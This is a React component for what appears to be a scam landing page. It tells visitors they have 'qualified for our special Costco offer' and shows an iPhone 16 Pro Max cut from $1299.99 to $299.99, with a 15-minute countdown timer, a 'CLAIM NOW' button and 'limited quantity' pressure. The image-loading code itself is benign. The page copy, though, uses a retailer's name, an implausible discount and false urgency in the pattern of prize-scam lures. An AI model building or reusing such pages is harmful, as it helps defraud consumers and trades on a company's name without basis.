
import { Button } from "@/components/ui/button";
import Timer from "@/components/Timer";
import { Check } from "lucide-react";
import { useEffect, useState } from "react";
import IPhoneImageFetcher from "@/components/IPhoneImageFetcher";
import { Skeleton } from "@/components/ui/skeleton";

interface ProductOfferProps {
  onClaim: () => void;
}

interface IPhoneImage {
  src: string;
  alt: string;
}

// Define guaranteed working fallback image with quality parameter
const FALLBACK_IMAGE = "/lovable-uploads/e8ded452-0d3c-44c9-8312-b92eea2579ef.png?q=50&w=300";
// Additional fallback from Unsplash with optimized load time
const UNSPLASH_FALLBACK = "https://images.unsplash.com/photo-1498050108023-c5249f4df085?auto=format&q=50&w=300";

const ProductOffer = ({ onClaim }: ProductOfferProps) => {
  const [selectedImage, setSelectedImage] = useState<string>(FALLBACK_IMAGE);
  const [imageLoaded, setImageLoaded] = useState(false);
  
  // Preload the fallback image immediately on component mount
  useEffect(() => {
    // Try loading both fallback options
    const unsplashFallback = new Image();
    unsplashFallback.src = UNSPLASH_FALLBACK;
    
    const img = new Image();
    img.onload = () => setImageLoaded(true);
    img.src = FALLBACK_IMAGE;
    
    // Also start loading the image displayed on screen
    const displayImg = new Image();
    displayImg.onload = () => setImageLoaded(true);
    displayImg.src = selectedImage;
    
    // Set a shorter timeout for faster display
    const timeout = setTimeout(() => {
      setImageLoaded(true);
    }, 1000); // Reduced from 2000ms to 1000ms
    
    return () => clearTimeout(timeout);
  }, []);
  
  const handleImagesFetched = (images: IPhoneImage[]) => {
    if (images.length > 0) {
      // Choose a specific image - the first one - instead of random
      let newSrc = images[0].src;
      
      // Add quality parameters to reduce image size if possible
      if (newSrc.includes('unsplash.com') || newSrc.includes('images.')) {
        newSrc = newSrc.includes('?') ? 
          `${newSrc}&q=50&w=300` : // Add quality and width params 
          `${newSrc}?q=50&w=300`; // Add quality and width params
      }
      
      // Only update if we have a different image to avoid re-render
      if (newSrc !== selectedImage && newSrc) {
        // Preload the new image before swapping
        const img = new Image();
        img.onload = () => {
          setSelectedImage(newSrc);
          setImageLoaded(true);
        };
        img.onerror = () => {
          // If the new image fails, try Unsplash fallback first, then default fallback
          const unsplashFallback = new Image();
          unsplashFallback.onload = () => {
            setSelectedImage(UNSPLASH_FALLBACK);
            setImageLoaded(true);
          };
          unsplashFallback.onerror = () => {
            // If Unsplash fails too, use the default fallback
            setSelectedImage(FALLBACK_IMAGE);
            setImageLoaded(true);
          };
          unsplashFallback.src = UNSPLASH_FALLBACK;
        };
        img.src = newSrc;
      }
    }
  };
  
  return (
    <div className="border border-gray-200 rounded-lg shadow-lg p-6 max-w-md mx-auto bg-white">
      <div className="text-center mb-4">
        <h3 className="text-xl font-bold text-gray-900">Congratulations!</h3>
        <p className="text-red-600 font-medium">You've qualified for our special Costco offer!</p>
      </div>

      <div className="mb-6">
        {/* Hidden image fetcher that provides images */}
        <div className="hidden">
          <IPhoneImageFetcher onComplete={handleImagesFetched} />
        </div>
        
        {/* Display the selected image with optimizations */}
        <div className="w-full h-48 relative rounded-md overflow-hidden">
          {!imageLoaded ? (
            <Skeleton className="w-full h-full absolute inset-0 rounded-md" />
          ) : null}
          <img 
            src={selectedImage} 
            alt="iPhone 16 Pro Max" 
            className={`w-full h-48 object-cover rounded-md ${imageLoaded ? 'opacity-100' : 'opacity-0'}`}
            style={{ transition: 'opacity 0.2s' }} // Faster transition
            width="300"
            height="192"
            loading="eager"
            fetchPriority="high"
            crossOrigin="anonymous"
            decoding="async"
            onLoad={() => setImageLoaded(true)}
            onError={() => {
              // Try Unsplash fallback first, then default fallback
              const unsplashFallback = new Image();
              unsplashFallback.onload = () => {
                setSelectedImage(UNSPLASH_FALLBACK);
                setImageLoaded(true);
              };
              unsplashFallback.onerror = () => {
                // If Unsplash fails too, use the default fallback
                const img = new Image();
                img.onload = () => setImageLoaded(true);
                img.src = FALLBACK_IMAGE;
                setSelectedImage(FALLBACK_IMAGE);
              };
              unsplashFallback.src = UNSPLASH_FALLBACK;
            }}
          />
        </div>
      </div>

      <div className="mb-6">
        <h4 className="font-bold text-lg mb-2">iPhone 16 Pro Max</h4>
        <div className="flex items-center mb-1">
          <Check className="h-4 w-4 text-red-500 mr-2" />
          <span className="text-gray-700">Latest A18 Pro chip</span>
        </div>
        <div className="flex items-center mb-1">
          <Check className="h-4 w-4 text-red-500 mr-2" />
          <span className="text-gray-700">48MP camera system</span>
        </div>
        <div className="flex items-center mb-1">
          <Check className="h-4 w-4 text-red-500 mr-2" />
          <span className="text-gray-700">All-day battery life</span>
        </div>
      </div>

      <div className="mb-6 text-center">
        <div className="flex items-center justify-center">
          <span className="text-gray-500 line-through text-lg mr-2">$1299.99</span>
          <span className="text-2xl font-bold text-red-600">$299.99</span>
        </div>
        <p className="text-blue-800 font-medium text-sm mt-1">+ FREE Shipping</p>
      </div>

      <Timer minutes={15} />

      <Button 
        onClick={onClaim} 
        className="w-full py-6 text-lg bg-red-600 hover:bg-red-700"
      >
        CLAIM NOW
      </Button>

      <p className="text-xs text-center text-gray-500 mt-4">
        Limited quantity available. Offer valid while supplies last.
      </p>
    </div>
  );
};

export default ProductOffer;
